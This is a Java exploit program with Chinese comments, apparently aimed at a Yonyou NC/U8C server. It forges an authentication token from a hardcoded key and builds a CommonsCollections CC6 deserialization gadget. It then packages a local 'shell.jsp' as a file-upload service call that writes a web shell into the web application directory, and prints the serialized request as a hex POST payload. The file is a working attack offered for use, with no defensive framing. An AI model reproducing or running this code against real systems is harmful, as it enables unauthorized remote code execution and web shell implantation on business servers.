package org.youkill;

import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.common.InvocationInfoProxy;
import nc.bs.framework.comn.NetObjectInputStream;
import nc.bs.framework.comn.NetObjectOutputStream;
import nc.bs.framework.comn.NetStreamConstants;
import nc.bs.framework.comn.Result;
import nc.bs.framework.comn.serv.ServiceDispatcher;
import nc.bs.framework.exception.FrameworkRuntimeException;
import nc.bs.framework.server.token.MD5Util;
import nc.bs.framework.server.token.TokenUtil;

import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.security.MessageDigest;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Main2 {
    public static void main(String[] args) throws Exception {
        String userCode = "#UAP#";
        Object payload = new CommonCollections().CC6(Evil.class.getName());

        File file=new File("shell.jsp");
        byte[] fileBytes=new byte[(int) file.length()];
        try(FileInputStream fis=new FileInputStream(file)){
            fis.read(fileBytes);
        }
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ZipOutputStream zipout=new ZipOutputStream(baos);
        ZipEntry entry=new ZipEntry("compressed");
        zipout.putNextEntry(entry);
        zipout.write(fileBytes);
        zipout.closeEntry();
        zipout.close();
        byte[] compressed=baos.toByteArray();
        baos.close();

        Class<?>[] paramTypes = new Class<?>[]{byte[].class, String.class};
        Object[] params = new Object[]{compressed, "webapps/u8c_web/h1UAP.jsp"};
        InvocationInfo invInfo = new InvocationInfo(
                "nc.itf.hr.tools.IFileTrans",
                "uploadFile",
                paramTypes,
                params
        );
        invInfo.setUserCode(userCode);
        invInfo.setToken(genToken(userCode));
        System.out.println("当前的token:"+invInfo.getToken()+"服务里面的:"+ TokenUtil.getInstance().genToken(userCode));
        System.out.println(invInfo.getToken().equalsIgnoreCase(TokenUtil.getInstance().genToken(userCode)));
        System.out.println(InvocationInfoProxy.getInstance().getUserCode());
        // ----------------------------
        // 3. 序列化 InvocationInfo
        // ----------------------------
        byte[] objectBytes = serializeInvocationInfo(invInfo);

        // ----------------------------
        // 4. 输出 hex，可直接用于 POST body
        // ----------------------------
        String hexString = DatatypeConverter.printHexBinary(objectBytes);
        System.out.println("Hex payload:");
        System.out.println(hexString);

        // ----------------------------
        // 5. 本地测试反序列化触发
        // ----------------------------
        ByteArrayInputStream bis = new ByteArrayInputStream(objectBytes);
        boolean[] streamRet = new boolean[]{
                NetStreamConstants.STREAM_NEED_COMPRESS,
                NetStreamConstants.STREAM_NEED_ENCRYPTED
        };

        Result result = new Result();
        try {
            invInfo = (InvocationInfo) NetObjectInputStream.readObject(bis, streamRet);
            ServiceDispatcher2 serviceDispatcher=new ServiceDispatcher2();
            try {
                result.result = serviceDispatcher.invokeBeanMethod(invInfo.getModule(), invInfo.getServiceName(), invInfo.getMethodName(), invInfo.getParametertypes(), invInfo.getParameters());
            } catch (Throwable e) {
                throw new RuntimeException(e);
            }

            try {
            } catch (Throwable e) {
                throw new RuntimeException(e);
            }
            System.out.println("反序列化完成，payload 已执行");
        } catch (Exception eof) {
            System.err.println("反序列化失败：" + eof.getMessage());
        }
    }

    public static String genToken(String userCode) {
        byte[] md5 = md5("ab7d823e-03ef-39c1-9947-060a0a08b931".getBytes(), userCode.getBytes());
        return MD5Util.byteToHexString(md5);
    }
    private static byte[] md5(byte[] key, byte[] tokens) {
        MessageDigest md = null;

        try {
            md = MessageDigest.getInstance("SHA-1");
            md.update(tokens);
            md.update(key);
            return md.digest();
        } catch (Exception var5) {
            Exception e = var5;
            throw new FrameworkRuntimeException("md5 error", e);
        }
    }
    private static byte[] serializeInvocationInfo(InvocationInfo invInfo) throws IOException {
        // 1) 先用 NetObjectOutputStream 序列化 InvocationInfo 得到 payload bytes
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        NetObjectOutputStream nos = new NetObjectOutputStream(bos);
        nos.writeObject(invInfo);
        nos.finish();
        nos.flush();
        byte[] payloadBytes = bos.toByteArray();

        // 2) 构造 length-prefixed final bytes（4 字节大端 len + payload）
        int len = payloadBytes.length; // 这就是 NetObjectInputStream 解析出的 len
        ByteArrayOutputStream out = new ByteArrayOutputStream(4 + len);
        out.write((len >>> 24) & 0xFF);
        out.write((len >>> 16) & 0xFF);
        out.write((len >>> 8) & 0xFF);
        out.write((len) & 0xFF);
        out.write(payloadBytes);

        // 可选：打印以便调试（可以注释掉）
//        System.out.println("serializeInvocationInfo: payload len = " + len + ", total = " + (4 + len));

        return out.toByteArray();
    }
}